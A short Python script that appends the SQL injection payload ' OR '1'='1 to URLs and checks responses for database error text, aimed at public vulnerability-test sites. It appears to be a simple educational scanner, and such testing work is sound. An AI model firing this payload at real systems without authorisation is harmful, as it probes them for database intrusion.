import requests

def sql_injection_test(url):
    payload = "' OR '1'='1"
    test_url = url + payload

    try:
        response = requests.get(test_url)
        if "syntax" in response.text.lower() or "mysql" in response.text.lower():
            print(f"Possible SQL Injection vulnerability found in {url}")
        else:
            print(f"No SQL Injection vulnerability found in {url}")

    except Exception as e:
        print(f"Error testing {url}:{e}")

if __name__ == "__main__":
    urls = [
        "http://scanme.nmap.org/",
        "http://testphp.vulnweb.com/artists.php?artist="

    ]
    for url in urls:
        sql_injection_test(url)

